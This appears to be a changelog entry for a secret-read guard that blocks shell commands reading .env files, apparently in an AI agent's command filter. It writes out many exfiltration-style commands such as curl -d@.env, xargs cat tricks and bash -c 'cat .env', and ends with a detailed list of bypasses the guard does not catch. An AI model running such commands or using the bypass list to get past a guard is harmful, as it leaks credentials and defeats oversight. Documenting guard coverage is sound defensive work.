**The secret-read guard blocks `.env` named inside curl option values such as `curl -d@.env` and `curl --cert .env:pw`** — `curl -d @.env` was denied, but curl opens `.env` just the same for `curl -d@.env`, `curl -sd@.env`, `curl -F file=@.env`, `curl -F "file=<.env"`, `curl --data-urlencode k@.env` and `curl --cert .env:pw`, and those were allowed. They are now denied, also behind `sudo`, `xargs`, `find -exec`, `npx`, `uv run` and `docker exec`, while `grep curl 'x@.env' f`, where `curl` is grep's operand, is allowed. Other commands now denied include `printf -- '-d\n@.env\n' | xargs curl x` and `printf '.env\n' | xargs cat` (words printed into `xargs`, escapes decoded), `cat <<EOF | xargs curl x` with `-d @.env` as the body and `cat <<< .env | tee out | xargs cat` (words a bare `cat` or a `tee` passes on), and `bash -c -- 'cat .env'`, `bash -c -euo pipefail 'cat .env'` and `bash -ce 'cat .env'` (a shell's `-c` script past its options). These reads behind a shell keyword, an assignment or a named fd are denied too: `if true; then bash -c 'cat .env'; fi`, `! curl -d@.env x`, `A+=b curl -d@.env x`, `a[x y]=1 curl -d@.env x`, `{fd}>/dev/null curl -d@.env x` and `sudo A=b curl -d@.env x`; `if [ -f .env ]; then …` stays denied. Some commands that read no secret are newly denied, among them `curl 'http://user@.env/'`, `curl -H 'Host: a@.env.com'`, `curl --form-string file=@.env x` and `curl --data-urlencode k=@.env x`, which curl sends as text; `echo '\x2eenv' | xargs cat`, which zsh's echo decodes and bash's does not without `-e`; a heredoc given to a `cat` whose output is redirected or that changes it (`cat <<EOF > f | xargs cat`, `cat -A <<EOF | xargs cat`); `echo '"-o" out "-E" c.pem' | xargs -I{} curl x {} .env:pw`; `caffeinate grep curl 'x@.env' f`, also behind `watch`, `npx`, `uv run` and `docker exec`; and a short `printf` that prints millions of words into `xargs`, denied as too complex. `xargs -i grep .env f` and `echo x | xargs -l grep .env f`, where `.env` is grep's pattern, are now allowed, as `xargs grep .env f` is. Not covered: a curl the guard does not resolve as a command (`ssh host curl …`, `nix run nixpkgs#curl -- …`, `docker run curl:8.5.0`, a launcher, `xargs` or `find -exec` at a fourth level of `xargs` or `find -exec` (`xargs xargs xargs xargs curl …`), `coproc`'s name in front of a compound command (`coproc x if curl …; then …`), a command it does not list as running another, or a command given as one string to a program the guard does not read it for, as in `docker exec c sh -c 'curl …'`); zsh's short `if [[ a && b ]] cmd`, where a word of the test ends the guard's segment (`&&`, `||`, `(`, `{`, a newline); a `((` whose body holds a `$(…)` with a case pattern or a comment, which can end that `$(…)` early for the guard; a named fd written right after a case pattern's `)` with no blank between (`case x in x){fd}>f curl …`); a curl value the shell builds when it runs the line, from a variable, a command substitution, a glob or a brace expansion (`curl -d @$f`, `curl -d @$(echo .env)`, `curl -T .e*`, `curl -d@{a,.env}`), a whole curl command held in a variable (`bash -c "$c"`), or printed by a command substitution, under `eval` or not (`eval "$(echo 'curl …')"`, `$(echo curl …)`); a file `xargs` reads its words from (`xargs curl x < list`); a filter such as `tr`, `sed`, `sort`, `head`, `cut` or `awk` between a `printf` or `echo` and `xargs -I{} sh -c` (`echo ENV | tr A-Z a-z | xargs -I{} sh -c 'cat .{}'`); a file named inside a curl config (`-K cfg`, `-K -`); curl's `{a,b}` globbing in an upload or `file://` name; and a name built from `--variable` values in an `--expand-*` option. (#5779)
